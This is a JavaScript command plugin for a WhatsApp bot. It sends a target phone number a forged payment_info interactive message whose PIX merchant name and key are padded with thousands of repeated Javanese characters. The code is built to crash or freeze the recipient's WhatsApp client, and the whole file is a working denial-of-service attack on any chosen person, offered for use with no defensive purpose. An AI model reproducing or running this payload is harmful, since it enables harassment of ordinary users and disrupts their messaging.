let handler = async (m, { conn, args }) => {
  if (!args[0]) return m.reply("📌 Usa: .porcpdio <numero>")

  let numi = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"

  try {
    await conn.relayMessage(numi, {
      "messageContextInfo": {
        "deviceListMetadata": {
          "recipientKeyHash": "mmsUMggo7tQ8+g==",
          "recipientTimestamp": "1754274809"
        },
        "deviceListMetadataVersion": 2,
        "messageSecret": "ZOpQ279X/FepMc200ZJ/uz9haymINnZtTuc/a2IJetY="
      },
      "interactiveMessage": {
        "nativeFlowMessage": {
          "buttons": [{
            "name": "payment_info",
            "buttonParamsJson": JSON.stringify({
              currency: "BRL",
              total_amount: { value: 0, offset: 100 },
              reference_id: "",
              type: "physical-goods",
              order: {
                status: "pending",
                subtotal: { value: 0, offset: 100 },
                order_type: "ORDER",
                items: [{
                  name: "",
                  amount: { value: 0, offset: 100 },
                  quantity: 0,
                  sale_amount: { value: 0, offset: 100 }
                }]
              },
              payment_settings: [{
                type: "pix_static_code",
                pix_static_code: {
                  merchant_name: "𝒂𝒏𝒕𝒊 𝒎𝒂𝒕𝒕𝒆𝒓" + "ꦽꦾꦃ".repeat(5555) + "ꦹ".repeat(5000),
                  key: "𝒃𝒚.𝐃𝐄𝐀𝐓𝐇 𝒙 𝐂𝐇𝐀𝐓𝐔𝐍𝐈𝐓𝐘" + "ꦹ".repeat(5000),
                  key_type: "EMAIL"
                }
              }],
              share_payment_status: false,
              referral: "chat_attachment"
            })
          }]
        }
      }
    },{
      additionalNodes: [
        {
          tag: "biz",
          attrs: { native_flow_name: "payment_info" }
        }
      ],
      participant: { jid: numi },
      userJid: numi
    })

    m.reply("✅ Messaggio inviato a " + args[0])
  } catch (e) {
    m.reply("⚠️ Errore: " + e.message)
  }
}

handler.command = /^porcpdio$/i
export default handler